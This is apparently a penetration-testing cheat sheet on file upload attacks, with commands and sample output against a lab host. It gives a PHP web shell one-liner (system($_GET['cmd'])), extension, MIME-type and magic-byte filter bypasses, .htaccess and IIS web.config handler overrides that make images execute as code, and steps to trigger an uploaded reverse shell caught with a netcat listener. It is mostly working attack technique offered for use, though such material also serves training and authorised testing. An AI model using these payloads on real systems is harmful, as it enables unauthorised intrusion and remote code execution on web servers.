# FILE UPLOAD ATTACKS

### Upload PHP reverse shell

Basic upload attempt — Check if .php is allowed

```bash
Upload pentestmonkey php-reverse-shell.php
```

<details>
<summary>Example Output</summary>

```
Upload pentestmonkey shell as shell.php
Response: 'File uploaded successfully'
Browse to: http://10.10.10.5/uploads/shell.php

nc -nlvp 443:
connect to [ATTACKER] from [10.10.10.5]
$ whoami
www-data
```
</details>

---

### Bypass extension filter

Try alternative extensions — Different PHP handlers

```bash
shell.php5
shell.phtml
shell.phar
shell.phps
shell.php.jpg
shell.PHP
shell.php%00.jpg
```

<details>
<summary>Example Output</summary>

```
shell.php    -> 'File type not allowed'
shell.php5   -> 'File type not allowed'
shell.phtml  -> 'File uploaded successfully!'
(phtml bypassed the filter)
```
</details>

---

### Bypass content-type check

Intercept and modify — Server checks MIME type only

```bash
Change Content-Type header to image/jpeg in Burp
```

<details>
<summary>Example Output</summary>

```
In Burp, change:
Content-Type: application/x-php
To:
Content-Type: image/jpeg

Server response: 'File uploaded successfully'
(Server only checked MIME type, not actual content)
```
</details>

---

### Double extension

Confuse extension parsing — Some servers check last/first ext

```bash
shell.php.png
shell.jpg.php
```

<details>
<summary>Example Output</summary>

```
shell.php.png -> 'Uploaded successfully'
But Apache processes .php first
Browse: http://10.10.10.5/uploads/shell.php.png
$ whoami
www-data
```
</details>

---

### Magic bytes bypass

Bypass magic byte checks — File starts as valid image

```bash
Add GIF89a; to start of PHP file
Or embed PHP in image EXIF
```

<details>
<summary>Example Output</summary>

```
Add GIF89a; at top of PHP shell:
GIF89a;
<?php system($_GET['cmd']); ?>

Upload as shell.gif.php or shell.php
Server sees GIF magic bytes, allows upload
```
</details>

---

### Upload .htaccess

Change how server handles files — Make .jpg execute as PHP

```bash
Upload .htaccess:
AddType application/x-httpd-php .jpg
Then upload shell.jpg
```

<details>
<summary>Example Output</summary>

```
Upload .htaccess containing:
AddType application/x-httpd-php .jpg

Then upload shell.jpg (with PHP code inside)
Browse: http://10.10.10.5/uploads/shell.jpg
$ whoami
www-data
(.jpg now executes as PHP)
```
</details>

---

### Upload web.config (IIS)

IIS equivalent of .htaccess — ASP/ASPX execution

```bash
Upload web.config with handler for .jpg as ASP
```

<details>
<summary>Example Output</summary>

```
Upload web.config:
<handlers>
  <add name='aspnet' path='*.jpg' verb='*' type='System.Web.UI.PageHandlerFactory'/>
</handlers>

Upload shell.jpg with ASP code
Browse to execute
(IIS treats .jpg as ASP)
```
</details>

---

### Find upload location

Where did the file go? — Need path to trigger execution

```bash
Check response, view source, or gobuster
```

<details>
<summary>Example Output</summary>

```
Response: 'File uploaded to /uploads/shell.php'
OR: View source -> <img src='/uploads/shell.php'>
OR: gobuster dir -u http://10.10.10.5 -w wordlist.txt
  /uploads/ (Status: 301)
(Need the path to trigger your shell)
```
</details>

---

### Trigger uploaded shell

Execute your uploaded file — Start netcat listener first

```bash
curl http://$IP/uploads/shell.php
or browse to it
```

<details>
<summary>Example Output</summary>

```
nc -nlvp 443
curl http://10.10.10.5/uploads/shell.php

Listening on 0.0.0.0 443
Connection received from 10.10.10.5
$ whoami
www-data
(Reverse shell caught!)
```
</details>

---
